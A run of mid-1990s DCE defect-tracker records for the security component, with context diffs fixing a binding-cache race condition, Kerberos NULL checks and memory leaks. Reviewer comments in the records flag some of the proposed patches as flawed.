Short Description             : assert in sec_rgy_site_close()
Reported Date                 : 8/3/95
Found in Baseline             : 1.1wp
Found Date                    : 6/15/95
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
security/client/rca/internal_binding.c
Sensitivity                   : public

[8/3/95 public]

Note: this may be the same problem reported by 12952.

There is a problem in the locking scheme in internal_binding.c
sec_rgy_site_close() only locks the context handle that it is passed,
NOT the cache_mutex (which protects against concurrent list ops.
There are several places in the code where a particular context is
chosen and the refcount incremented under only the cache_mutex lock, not
its individual handle lock.  

        binding_cache_enter(): When a new context is being created, 
           rca_handle_init() sets the refcount to 1.  This is OK since
           the new context is not in the cache list yet (so it is in-
           visible to other operations).  rca_site_bind() calls 
           binding_cache_enter() to actually enter the new context into
           the list.  Under the protection of cache_mutex only, 
           binding_cache_enter() inc's refcount.  If an app has called
           sec_rgy_site_close(), there is a race condition since 
           sec_rgy_site_close() takes only the context handle mutex.

           I was able to move the refcount++ up in the routine so 
           that it gets done before the new context is inserted into
           the cache (and is thus visible to other routines like
           sec_rgy_site_close).  This change was just more efficient
           since I got away with not taking a lock!

        binding_cache_lookup(): Exactly the same problem here.  At the
           end of the routine, under the protection of only cache_mutex,
           refcount is inc'd.  This indicates a cache hit.  But the same
           race condition exists as mentioned above for binding_cache_enter().

           I added a call to rca_lock_handle() to lock the context just
           inside the loop where cur traverses the cache.  Then at the
           bottom of the loop (in the case of a cache hit) AND just outside
           of the loop (in the case of a cache miss) I added the necessary
           rca_unlock_handle().

A concrete example of the race condition.  thread1 has already opened
a context in ismember() by calling sec_rgy_site_open().  At the end
of ismember() it calls sec_rgy_site_close() to release the handle.
Suppose that thread1 has gotten into sec_rgy_site_close(), taken the
handle mutex and has started to decrement refcount.  That is, it
has loaded the 'current' value, in this case 2, into a register.  Now
thread1 gets pre-empted and thread2 resumes.  Suppose thread2 is
attempting to open the same context.  It gets into binding_cache_lookup(),
takes cache_mutex (not the context handle mutex) and then, at the
end of the routine, it increments refcount from 2 to 3.  Now thread2 
gets pre-empted and thread1 resumes.  It continues decrementing refcount
by decrementing the register that it loaded, and then stores the new
value of refcount (1) back into the context.  Now the next time that
thread2 resumes and tries to call sec_rgy_site_close(), it will
barf since the link fields (cache_next and cache_prev) are still valid
but the refcount is 1.

Long and short of it is that any internal routine that reads/writes
anything inside of a context HAS to take the context mutex.

Another problem - the global variable binding_clock is not protected
by any mutex.  This means that the ordering assumed by the routines that
set/use the last_used field of a context handle is not garunteed.  This
should not be a *FUNCTIONAL* problem, since this ordering is used only
for gc'ing in purge/purge_int.  But the value does bounce around in 
'random' fashion.  Since this is the case, I suggest we use a system
clock fetch routine.  Otherwise we would have to protect access to
binding_clock via a mutex.  The only other alternative is not to use an
LRU purging algorithm in purge/purge_int (i.e. we don't care which
of the currently unused context gets gc'ed.  This has the advantage
of being efficient at purge time, but in a heavily used scenario,
it will cause unnecessary thrashing of the cache).

Changed the code to call time() (from libc) to timestamp the context
handles.  This doesn't use binding_clock at all, though it is a slight
performance hit.  But at least there will be an ordering that 
purge/purge_int can rely on to implement its LRU disposal mechanism.

=============================================================
src/security/client/rca/internal_binding.c
=============================================================
***************
*** 229,234 ****
--- 229,237 ----
  #include <dce/sec_login_util.h>
  #include <u_str.h>

+ #include <sys/time.h>
+ #include <sys/types.h>
+
  #include <sec_svc.h>
  #include <sec_bind_util.h>

***************
*** 373,378 ****
--- 376,383 ----
  {
      assert(new_context->cache_next == NULL);
      assert(new_context->cache_prev == NULL);
+     new_context->refcount++;
+
      if (!cache_mutex_inited) {
        pthread_once(&cache_mutex_once, rca_create_cache_mutex);
      }
***************
*** 393,399 ****
        cache_head->cache_prev = new_context;
        cache_head = new_context;
      }
-     new_context->refcount++;
      rca_cache_enters++;

      V(cache_mutex);
--- 398,403 ----
***************
*** 527,533 ****
      unsigned char *cell;
      rca_pvt_handle_blk_t **context;
  {
!     rca_pvt_handle_blk_t *cur;
      if (!cache_mutex_inited) {
        pthread_once(&cache_mutex_once, rca_create_cache_mutex);
      }
--- 531,539 ----
      unsigned char *cell;
      rca_pvt_handle_blk_t **context;
  {
!     rca_pvt_handle_blk_t *cur, *prev=NULL;
!     error_status_t        status;
!
      if (!cache_mutex_inited) {
        pthread_once(&cache_mutex_once, rca_create_cache_mutex);
      }
***************
*** 538,543 ****
--- 544,560 ----

      for (cur = cache_head; cur != NULL; cur = cur->cache_next)
      {
+         rca_lock_handle( &(cur->mutex) , &status);
+         if (STATUS_OK(&status)) {
+                 /**
+                  ** We have to let go of the mutex for the previous
+                  ** handle we looked at.
+                  **
+                  **/
+                 if (prev)
+                         rca_unlock_handle( &(prev->mutex) );
+                 prev=cur;
+
        SEC_DBG_PRINTF(3,("(binding_cache_lookup) Looking at %x: site `%s' cell
`%s' princ `%s' %d\n", cur,
                cur->site_name, cur->cell_name, cur->princ_name,
                cur->auth_info.info_type));
***************
*** 620,628 ****
--- 637,652 ----
        SEC_DBG_PRINTF(2,("(binding_cache_lookup) Cache hit: returning %x\n", cu
r));
        cur->refcount++;
        *context = cur;
+         rca_unlock_handle( &(cur->mutex) );
+
        V(cache_mutex);
        return true;
+       }
      }
+
+     if (prev)
+         rca_unlock_handle( &(prev->mutex) );
+
      V(cache_mutex);

      SEC_DBG_PRINTF(2,("(binding_cache_lookup) Cache miss\n"));
***************
*** 1638,1644 ****
          return false;
      }
      /* set last time used */
!     context->last_used = binding_clock++;

      SEC_DBG_PRINTF(6, ("(rca_check_binding) flags is %x\n", context->handle_fl
ags));

--- 1662,1668 ----
          return false;
      }
      /* set last time used */
!     context->last_used = (unsigned32)time(NULL);

      SEC_DBG_PRINTF(6, ("(rca_check_binding) flags is %x\n", context->handle_fl
ags));

***************
*** 2018,2024 ****
      new_context->cache_next = NULL;
      new_context->cache_prev = NULL;
      new_context->refcount = 1;
!     new_context->last_used = binding_clock++;
      new_context->handle_flags = RCA_HANDLE_FLAGS_NONE;
      new_context->import_flags = 0;
      new_context->rpc_handle = 0;
--- 2042,2048 ----
      new_context->cache_next = NULL;
      new_context->cache_prev = NULL;
      new_context->refcount = 1;
!     new_context->last_used = (unsigned32)time(NULL);
      new_context->handle_flags = RCA_HANDLE_FLAGS_NONE;
      new_context->import_flags = 0;
      new_context->rpc_handle = 0;

[8/15/95 public]

I'm interested in using this patch, but I have a question about the
arguments you pass to rca_lock_handle() and rca_unlock_handle().  In 
the code above, you have

rca_lock_handle ( &(cur->mutex) , &status)
-and-
rca_unlock_handle ( &(prev->mutex) )

How is it that you can pass in a mutex, when the declarations
for rca_lock_handle() and rca_unlock_handle() have the
first argument declared as a pointer to a sec_rgy_handle_t
and a sec_rgy_handle_t, respectively?

[8/31/95 public]

I tried a similar fix as noted in OT# 12952. But I have seen deadlock in the
following call chain:
 
        binding_cache_lookup()
        bca_site_bind()
        sec_krb5rpc_sendto_kdc()
        krb5_sendto_kdc()
        krb5_send_tgs()
        krb5_get_cred_via_tgt()
        krb5_get_cred_from_kdc()
        krb5_get_credentials_dce()
        sec_krb_get_cred()
        rpc__krb_get_tkt()
        rpc__krb_dg_pre_call()
        rpc__dg_call_start()
        rpc_call_start()
        op3_csr()
 
        sec__id_parse_name()
 
        sec_id_parse_name()
        sec_krb_sec_parse_name()
        rpc__krb_bnd_set_auth()
        rpc_binding_set_auth_info()
 
sec__id_parse_name() has already done rca_lock_handle().
If tickets have expired, then sec_krb5rpc_sendto_kdc() uses RCA to bind to KDC
and results in deadlock.



CR Number                     : 13010
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : sec
Subcomponent Name             : 
Short Description             : secd traps
Reported Date                 : 8/3/95
Found in Baseline             : 1.1
Found Date                    : 6/12/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
security/krb5/lib/krb/princ_fcomp.c
security/krb5/kdc/do_tgs_req.c
security/krb5/lib/kdb/decrypt_key.c
security/server/rs/rpriv_util.c
Sensitivity                   : public

[8/3/95 public]

Problems found while debugging secd traps.

1) verify inputs to krb5_principal_equiv() (princ_fcomp.c)
2) initialize variable fromstring in process_tgs_req() (do_tgs_req.c)
3) invalid length with memcpy() in krb5_kdb_decrypt_key() (decrypt_key.c)
4) a. verify input argument princ in is_priv_server() (rpriv_util.c)
   b. verify input argument ptgt-req in rpriv_util_parse_request(),
	set status if NULL. 

================================================================================
src/security/krb5/lib/krb/princ_fcomp.c
================================================================================
***************
*** 116,121 ****
--- 116,124 ----
  {
      register krb5_data * const *p1, * const *p2;

+     if (princ1 == NULL || princ2 == NULL)
+        return FALSE;
+
      if (!krb5_realm_equiv (*princ1, *princ2))
        return FALSE;

================================================================================
src/security/krb5/kdc/do_tgs_req.c
================================================================================
***************
*** 196,202 ****
      krb5_keyblock *session_key = 0;
      krb5_timestamp until, rtime;
      krb5_keyblock encrypting_key;
!     char *cname = 0, *sname = 0, *tmp = 0, *fromstring = 0;
      krb5_last_req_entry *nolrarray[2], nolrentry;
  /*    krb5_address *noaddrarray[1]; */
      krb5_enctype useetype;
--- 196,202 ----
      krb5_keyblock *session_key = 0;
      krb5_timestamp until, rtime;
      krb5_keyblock encrypting_key;
!     char *cname = 0, *sname = 0, *tmp = 0, *fromstring = "<unknown>";
      krb5_last_req_entry *nolrarray[2], nolrentry;
  /*    krb5_address *noaddrarray[1]; */
      krb5_enctype useetype;

================================================================================
src/security/krb5/lib/kdb/decrypt_key.c
================================================================================
***************
*** 91,97 ****
        return ENOMEM;
      }
      /* copy out the real length count */
!     memcpy((char *)&out->length, (char *)in->contents, sizeof(out->length));

      /* remember the contents of the encrypted version has a sizeof(in->length)
         integer length of the real embedded key, followed by the
--- 91,97 ----
        return ENOMEM;
      }
      /* copy out the real length count */
!       memcpy((char *)&out->length, (char *)in->length, sizeof(out->length));

      /* remember the contents of the encrypted version has a sizeof(in->length)
         integer length of the real embedded key, followed by the

================================================================================
src/security/server/rs/rpriv_util.c
================================================================================
***************
*** 302,308 ****
      if (priv_princ == NULL) {
          (void) krb5_parse_name((char *)SEC_PRIV_SERVER_NAME, &priv_princ);
      }
!     if (priv_princ != NULL) {
        if (krb5_principal_equiv(princ, priv_princ)) {
              return 1;
          }
--- 302,308 ----
      if (priv_princ == NULL) {
          (void) krb5_parse_name((char *)SEC_PRIV_SERVER_NAME, &priv_princ);
      }
!     if (priv_princ != NULL && princ != NULL) {
        if (krb5_principal_equiv(princ, priv_princ)) {
              return 1;
          }
***************
*** 1028,1033 ****
--- 1028,1038 ----

      memset(authz_data, 0, sizeof(*authz_data));
      *req_info = NULL;
+
+     if (ptgt_req == NULL) {
+       SET_STATUS(stp,sec_priv_s_no_mem);
+       return;
+     }

      krb_req.length = ptgt_req->num_bytes;
      krb_req.data = (char *) ptgt_req->bytes;

[08/03/95 public]
Is it really legal to pass in NULL?
If not, then this defect should probably be cancelled.
DCE does not try to "validate" its input parameters because it's
impossible to do completely, and lets programmers be sloppy, not fixing
their own errors.  Something coredumps usually make you do. :)



CR Number                     : 13008
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : sec
Subcomponent Name             : 
Short Description             : Mem leak in security API's
Reported Date                 : 8/2/95
Found in Baseline             : 1.1wp
Found Date                    : 5/23/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 1.1maint
Affected File(s)              : 
security/client/login/sec_login_pvt.c
security/client/acl/daclbind.c
security/client/acl/dacl_ifr.c
security/krb5/kdc/do_tgs_req.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[8/2/95 public]
The culprit is find_alternate_tgs, where they temporarily replace the realm in
an element of this krb5_principal structure with the realm of the tgs server,
make a call to krb5_db_get_principal, then try to put the original realm back in
the structure.  However, they dereferenced the pointer where they shouldn't have
and end up replacing the original realm pointer with a pointer to the temporary
save spot on the stack.

On the client side, the cause of the bogus string name is the memory that
the cell name resides in being freed by someone else and then reallocated and
used to store a uuid.  The cause of the inappropriate free is a string pointer
not being set via rpc_stralloc (so it would have its own copy) and then later
being passed to rpc_string_free.

=============================================================
src/security/client/login/sec_login_pvt.c
=============================================================
***************
*** 3617,3622 ****
--- 3617,3623 ----
                                  (unsigned_char_t *) cell_pgo_name, &unix_sid,
                                  &user_part, &admin_part, &policy, NULL, stp);
          }
+       free(cell_pgo_name);

      } else {

=============================================================
src/security/client/acl/daclbind.c
=============================================================
***************
*** 446,455 ****
                 * unresolved_name pointer if we do component_name =
                 * unresolved_name later on.
                 */
!               tmp_unresolved_name = (unsigned_char_p_t)malloc(strlen(
!                   (char *)unresolved_name));
!               strcpy((char *)tmp_unresolved_name, (char *)(unresolved_name +
!                   1));
                free(unresolved_name);
                  unresolved_name = tmp_unresolved_name;
            }
--- 446,452 ----
                 * unresolved_name pointer if we do component_name =
                 * unresolved_name later on.
                 */
!               tmp_unresolved_name = rpc_stralloc(unresolved_name);
                free(unresolved_name);
                  unresolved_name = tmp_unresolved_name;
            }
***************
*** 461,466 ****
--- 458,464 ----
              strcpy((char *) component_name, (char *) unresolved_name);
              strcat((char *) component_name, "/");
              strcat((char *) component_name, (char *) residual);
+           rpc_string_free (&unresolved_name, &st);
          }
          else {
              component_name = unresolved_name;
***************
*** 617,622 ****
--- 615,623 ----
              new_context->resolved_name[0] = '\0';
          }
      }
+
+     if (unresolved_name != NULL)
+        rpc_string_free (&unresolved_name, &st);

      if (STATUS_EQUAL(st_p, sec_login_s_no_current_context)) {
          SET_STATUS(st_p, sec_acl_unable_to_authenticate);


=============================================================
src/security/client/acl/dacl_ifr.c
=============================================================
***************
*** 741,747 ****
          free(COMPONENT_NAME(*h));
      }
      if (RESOLVED_NAME(*h) != (unsigned_char_p_t)NULL) {
!         free(RESOLVED_NAME(*h));
      }
      if (IS_DFS_ACL(*h)) {
          free(*h);
--- 741,747 ----
          free(COMPONENT_NAME(*h));
      }
      if (RESOLVED_NAME(*h) != (unsigned_char_p_t)NULL) {
!       rpc_string_free(&(RESOLVED_NAME(*h)), st_p);
      }
      if (IS_DFS_ACL(*h)) {
          free(*h);
***************
*** 751,757 ****
          if (IMPORT_HANDLE_VALID(*h))
              rpc_ns_binding_import_done(&(IMPORT_HANDLE(*h)), st_p);
          if (HANDLE_STR(*h) != (unsigned_char_p_t) NULL)
!             free((char *) HANDLE_STR(*h));
          free(*h);
          *h = NULL;
      }
--- 751,757 ----
          if (IMPORT_HANDLE_VALID(*h))
              rpc_ns_binding_import_done(&(IMPORT_HANDLE(*h)), st_p);
          if (HANDLE_STR(*h) != (unsigned_char_p_t) NULL)
!           rpc_string_free(&(HANDLE_STR(*h)), st_p);
          free(*h);
          *h = NULL;
      }

=============================================================
src/security/krb5/kdc/do_tgs_req.c
=============================================================
***************
*** 1052,1058 ****
  {
      krb5_error_code retval;
      krb5_principal *plist, *pl2;
!     krb5_data tmp;

      *nprincs = 0;
      *more = FALSE;
--- 1052,1058 ----
  {
      krb5_error_code retval;
      krb5_principal *plist, *pl2;
!     krb5_data *tmp;

      *nprincs = 0;
      *more = FALSE;
***************
*** 1073,1082 ****
         ignore it */
      while (--pl2 > plist) {
        *nprincs = 1;
!       tmp = *krb5_princ_realm(*pl2);
        krb5_princ_set_realm(*pl2, krb5_princ_realm(tgs_server));
        retval = krb5_db_get_principal(*pl2, *keytype, 0, server, nprincs, more)
;
!       krb5_princ_set_realm(*pl2, &tmp);
        if (retval) {
            *nprincs = 0;
            *more = FALSE;
--- 1073,1082 ----
         ignore it */
      while (--pl2 > plist) {
        *nprincs = 1;
!       tmp = krb5_princ_realm(*pl2);
        krb5_princ_set_realm(*pl2, krb5_princ_realm(tgs_server));
        retval = krb5_db_get_principal(*pl2, *keytype, 0, server, nprincs, more)
;
!       krb5_princ_set_realm(*pl2, tmp);
        if (retval) {
            *nprincs = 0;
            *more = FALSE;
***************
*** 1091,1104 ****
            krb5_principal tmpprinc;
            char *sname;

!           tmp = *krb5_princ_realm(*pl2);
            krb5_princ_set_realm(*pl2, krb5_princ_realm(tgs_server));
            if (retval = krb5_copy_principal(*pl2, &tmpprinc)) {
                krb5_db_free_principal(server, *nprincs);
!               krb5_princ_set_realm(*pl2, &tmp);
                continue;
            }
!           krb5_princ_set_realm(*pl2, &tmp);

            krb5_free_principal(request->server);
            request->server = tmpprinc;
--- 1091,1104 ----
            krb5_principal tmpprinc;
            char *sname;

!           tmp = krb5_princ_realm(*pl2);
            krb5_princ_set_realm(*pl2, krb5_princ_realm(tgs_server));
            if (retval = krb5_copy_principal(*pl2, &tmpprinc)) {
                krb5_db_free_principal(server, *nprincs);
!               krb5_princ_set_realm(*pl2, tmp);
                continue;
            }
!           krb5_princ_set_realm(*pl2, tmp);

            krb5_free_principal(request->server);
            request->server = tmpprinc;

[8/17/95 public]

The last rpc_string_free(&unresolved_name) that you add to daclbind.c may 
unwittingly free up component_name, which you don't want to do because
component_name gets passed back to the caller in new_context.  
unresolved_name is freed up (in the original version at line 493), unless
it's identical to component_name.  So the additional rpc_string_free is
redundant and dangerous.

493:

/* If we had an unresolved name and it's not the component name, free it */
    if ((unresolved_name != NULL) && (unresolved_name != component_name))
        free((char *)unresolved_name);

There are other memory management problems with daclbind.c, that appear
in the cleanup of new_context in the error case.  It's hard to tell, but 
it doesn't appear that the various strings assigned to new_context fields 
are cleaned up.

[9/11/95 public]

From Tom at Gradient has to say the following:

This change to daclbind.c is wrong:
***************
*** 617,622 ****
--- 615,623 ----
              new_context->resolved_name[0] = '\0';
          }
      }
+
+     if (unresolved_name != NULL)
+        rpc_string_free (&unresolved_name, &st);

      if (STATUS_EQUAL(st_p, sec_login_s_no_current_context)) {
          SET_STATUS(st_p, sec_acl_unable_to_authenticate);

You can not free this, as "unresolved_name" is assigned to 
"new_context->component_name" above this code.  It isn't needed
anyway since we already checked unresolved name for NULL and
free'd it if it wasn't assigned to component_name.

If this change is made (at least on my SVR4), an acl_edit /.:/sec/group -l
or dcecp -c acl show /.:/sec/group will FAIL.

[10/7/96 public]

Fixed in 1.1maint.



CR Number                     : 13007
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : sec
Subcomponent Name             : 
Short Description             : rpc_binding_free misplaced in rca_rebind()
Reported Date                 : 8/2/95
Found in Baseline             : 1.1unintegrated
Found Date                    : 10/10/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 1.1maint
Affected File(s)              : security/client/rca/internal_binding.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[8/2/95 public]

Under certain situations, some code that frees binding handles before
they are replaced with new handles was prematurely freeing
a binding handle to the security server, which it was still using.  
The freeing code was moved to only hit the cases where the handle was
about to be replaced.

=============================================================
src/security/client/rca/internal_binding.c
=============================================================
***************
*** 1298,1303 ****
--- 1298,1307 ----
      sec_rgy_bind_auth_info_t    *auth_info = &context->auth_info;

      CLEAR_STATUS(status);
+
+     if (context->rpc_handle)
+         rpc_binding_free (&context->rpc_handle, &xst);
+
      context->rpc_handle = NULL;

      start = context->tower_vec_index;
***************
*** 1443,1448 ****
--- 1447,1456 ----
        if (h != NULL)
        {
            boolean32 bound;
+
+             if (context->rpc_handle)
+                 rpc_binding_free (&context->rpc_handle, &xst);
+
            SEC_DBG_GPRINTF(("(rca_rebind) Took alt_handle %d from context\n", i
));
            context->rpc_handle = h;
            SET(context->handle_flags, RCA_HANDLE_FLAGS_VALID);

[10/7/96 public]
Fixed in 1.1maint.



CR Number                     : 13005
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : sec
Subcomponent Name             : 
Short Description             : mem leak rca_site_bind_nsi_cell_if()
Reported Date                 : 8/2/95
Found in Baseline             : 1.1unintegrated
Found Date                    : 6/16/95
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 1.1maint
Affected File(s)              : security/client/rca/internal_binding.c
Sensitivity                   : public

[8/2/95 public]

The cell_name allocated by the rpc_stralloc() is overwriten in
rca_site_bind_nsi_cell_if().

=============================================================
security/client/rca/internal_binding.c
=============================================================
***************
*** 1728,1733 ****
--- 1728,1735 ----

        SEC_DBG_GPRINTF(("(rca_site_bind_nsi_cell) about to call rca_setup_handl
e; rpc_handle==%x\n", context->rpc_handle));
        if (rca_setup_handle(context, status)) {
+           if ( context->cell_name )  /* CMVC #14569 */
+               rpc_string_free( &context->cell_name , &st);
            context->cell_name = cell_name;
            return;
        }

[11/03/95 public]
Fix submitted to 1.1maint tree.



CR Number                     : 13000
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : sec
Subcomponent Name             : 
Short Description             : Inconsistent malloc()/free(), memory leakage
Reported Date                 : 8/2/95
Found in Baseline             : 1.1wp
Found Date                    : 8/2/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 1.1maint
Affected File(s)              : src/security/utils/sec_authn.c
src/security/helper/auth_helper.c, src/security/client/rca/binding.c
Sensitivity                   : public

[8/2/95 public]

Inconsistent malloc and free calls due to introduction of
RPC memory pool in AIX DCE will cause memory leakage.
The memory allocated using rpc_stralloc (currently using RPC
memory pool) is being freed somewhere else in security
using system free call.

=====================================================================
src/security/utils/sec_authn.c
=====================================================================
***************
*** 499,512 ****
       */
      free(cell);
      free(principal);
!     outname = rpc_stralloc ((unsigned char *)tempname);
!     if (outname != NULL)
!     {
!       *name = outname;
!     } else {
!         SET_STATUS(&st, sec_rgy_cant_allocate_memory);
!     }
!     free (tempname);
      return st;
  }

--- 499,506 ----
       */
      free(cell);
      free(principal);
!     *name = tempname;
!
      return st;
  }

***************
*** 695,701 ****

          if (strcmp((char *)server_global, (char *)id->server_global) == 0) {
              /* !!! this may not be right allocator here.. */
!             rpc_string_free (&server_global, &xst);

              if (id->get_key_func) {
                  rpc_auth_key_retrieval_fn_t tmp_get_key_func = id->get_key_fun
c;
--- 689,695 ----

          if (strcmp((char *)server_global, (char *)id->server_global) == 0) {
              /* !!! this may not be right allocator here.. */
!           free(server_global);   /* sec_krb_unparse_name() uses malloc() */

              if (id->get_key_func) {
                  rpc_auth_key_retrieval_fn_t tmp_get_key_func = id->get_key_fun
c;
***************
*** 728,734 ****
          }
      }
      UNLOCK_IDENTITY();
!     rpc_string_free (&server_global, &xst);
      return KRB5KRB_AP_WRONG_PRINC;
  }

--- 722,728 ----
          }
      }
      UNLOCK_IDENTITY();
!     free(server_global);        /* sec_krb_unparse_name() uses malloc() */
      return KRB5KRB_AP_WRONG_PRINC;
  }

***************
*** 909,915 ****
                  *global_name = NULL;
                  return st;
              }
!             *global_name = tname;
              return error_status_ok;
          }
          else
--- 903,912 ----
                  *global_name = NULL;
                  return st;
              }
!             *global_name = malloc(strlen(tname)+1);
!             strcpy(*global_name, tname);
!             rpc_string_free(&tname, &st);
!
              return error_status_ok;
          }
          else
***************
*** 1038,1044 ****
          sec__serv_id_table = nid;

          sec__serv_id_table[sec__n_idents].server_string =
!             rpc_stralloc(server_princ_name);
          sec__serv_id_table[sec__n_idents].server_global = server_global;
          sec__serv_id_table[sec__n_idents].get_key_func = get_key_func;
          sec__serv_id_table[sec__n_idents].arg = arg;
--- 1035,1043 ----
          sec__serv_id_table = nid;

          sec__serv_id_table[sec__n_idents].server_string =
!             malloc(strlen(server_princ_name) + 1);
!         strcpy(sec__serv_id_table[sec__n_idents].server_string, server_princ_n
ame);
!
          sec__serv_id_table[sec__n_idents].server_global = server_global;
          sec__serv_id_table[sec__n_idents].get_key_func = get_key_func;
          sec__serv_id_table[sec__n_idents].arg = arg;
***************
*** 1117,1123 ****
          }
        if (BAD_STATUS(&st)) {
            sec__n_idents--;
!           rpc_string_free(&sec__serv_id_table[sec__n_idents].server_string, &x
st);
            free(sec__serv_id_table[sec__n_idents].server_global);
        }
      }
--- 1116,1122 ----
          }
        if (BAD_STATUS(&st)) {
            sec__n_idents--;
!           free(sec__serv_id_table[sec__n_idents].server_string);
            free(sec__serv_id_table[sec__n_idents].server_global);
        }
      }
***************
*** 1808,1814 ****
          case rpc_c_authz_name:
              message->data[message->length-1] = '\0';

!             *client_name = rpc_stralloc (&message->data[1]);

              *authz_proto = rpc_c_authz_name;
            *authentP == NULL;
--- 1807,1814 ----
          case rpc_c_authz_name:
              message->data[message->length-1] = '\0';

!             *client_name = malloc (strlen(&message->data[1]) + 1);
!             strcpy(*client_name, &message->data[1]);

              *authz_proto = rpc_c_authz_name;
            *authentP == NULL;

***************
*** 2211,2223 ****
      sec_encode_v1_1_authz_data_free(free, &v1_1_ad);

      if (authP->server_princ_name) {
!       rpc_string_free(&authP->server_princ_name, &ignore_st);
      }

      if (BAD_STATUS(&st))
      {
        if (client_name && *client_name)
!           rpc_string_free(client_name, &ignore_st);

        if (server_name && *server_name)
            sec_krb_parsed_name_free(server_name);
--- 2211,2223 ----
      sec_encode_v1_1_authz_data_free(free, &v1_1_ad);

      if (authP->server_princ_name) {
!       free(authP->server_princ_name);
      }

      if (BAD_STATUS(&st))
      {
        if (client_name && *client_name)
!           free( *client_name );

        if (server_name && *server_name)
            sec_krb_parsed_name_free(server_name);

=====================================================================
src/security/utils/sec_authn.c
=====================================================================
***************
*** 564,570 ****
     if (n != NULL) { \
         status = sec_krb_unparse_name(n, &tempname); \
         PUT_STRING(ptr, tempname); \
!        rpc_string_free(&tempname, &xst); \
     } else { \
         PUT_STRING(ptr, NULL); \
     } \
--- 564,570 ----
     if (n != NULL) { \
         status = sec_krb_unparse_name(n, &tempname); \
         PUT_STRING(ptr, tempname); \
!        free(tempname); \
     } else { \
         PUT_STRING(ptr, NULL); \
     } \
***************
*** 1019,1025 ****
        PUT_SEC_BYTES(outptr, &raw_epac_set);
      }
      if (client_name)
!         rpc_string_free(&client_name, &xst);
      if (server_name)
          sec_krb_parsed_name_free(&server_name);
      if (tmpsvr)
--- 1019,1025 ----
        PUT_SEC_BYTES(outptr, &raw_epac_set);
      }
      if (client_name)
!         free(client_name);
      if (server_name)
          sec_krb_parsed_name_free(&server_name);
      if (tmpsvr)

=====================================================================
src/security/client/rca/binding.c
=====================================================================
***************
*** 305,325 ****
      rca_lock_handle(&context, status);

      if (cell_name && STATUS_OK(status) && CELL_NAME(context)) {
!       *cell_name = rpc_stralloc(CELL_NAME(context));
        if (*cell_name == NULL)
        {
            SET_STATUS(status, sec_rgy_cant_allocate_memory);
              goto free_none;
        }
      }

      if (server_name && STATUS_OK(status) && SITE_NAME(context)) {
!         *server_name = rpc_stralloc(SITE_NAME(context));
!
          if (*server_name == NULL) {
              SET_STATUS(status, sec_rgy_cant_allocate_memory);
              goto free_cell_name;
          }
      }

      if (string_binding && STATUS_OK(status)) {
--- 305,326 ----
      rca_lock_handle(&context, status);

      if (cell_name && STATUS_OK(status) && CELL_NAME(context)) {
!       *cell_name = malloc(strlen(CELL_NAME(context)) + 1);
        if (*cell_name == NULL)
        {
            SET_STATUS(status, sec_rgy_cant_allocate_memory);
              goto free_none;
        }
+       strcpy(*cell_name, CELL_NAME(context));
      }

      if (server_name && STATUS_OK(status) && SITE_NAME(context)) {
!       *server_name = malloc(strlen(SITE_NAME(context)) + 1);
          if (*server_name == NULL) {
              SET_STATUS(status, sec_rgy_cant_allocate_memory);
              goto free_cell_name;
          }
+       strcpy(*server_name, SITE_NAME(context));
      }

      if (string_binding && STATUS_OK(status)) {

[1/11/96 public]
Submitted the above fix (along with addition for checking NULL pointer
after malloc() ) to the 1.1 maint tree.



CR Number                     : 12983
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : gds
Subcomponent Name             : gdad
Short Description             : customer debugging enhancement
Reported Date                 : 8/1/95
Found in Baseline             : 1.1
Found Date                    : 8/1/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[8/1/95 public]

 The diffs included here are contributed by HAL as an enhancement
 to gdad for aiding debugging.

From spike@hal.com Mon May  8 14:35:08 1995

Parul,

As promised, here are my DNS debugging enhancements for gdad.  To get
the debugging compiled in, you set the CENV environment variable to
'-DGDA_BIND_DEBUG -DDCE_CDS_DEBUG'.

Hopefully, these context diffs will work.  I had to hand-remove all
HaL-proprietary stuff, including headers.  The diffs should work.

**********Here's the context diff for src/directory/cds/gda/gda_clerk.c:*******

*** gda_clerk.c	Mon May  8 10:02:23 1995
- --- /aus2g/dce/dce11_intl_sb/src/directory/cds/gda/gda_clerk.c	Wed Aug  3 14:01:34 1994
***************
*** 168,182 ****
    printf("    Towers:\n");
    tower_p = rp_p->rp_towers;
    cnt = GETL16(tower_p);	/* number of towers */
! #ifdef GDA_BIND_DEBUG
    printf("       %d towers\n", cnt);
! #endif /* GDA_BIND_DEBUG */
    for (/* cnt (as assigned above) */ ; cnt > 0; --cnt) 
    {
      len = GETL16(tower_p);      /* size of the tower */
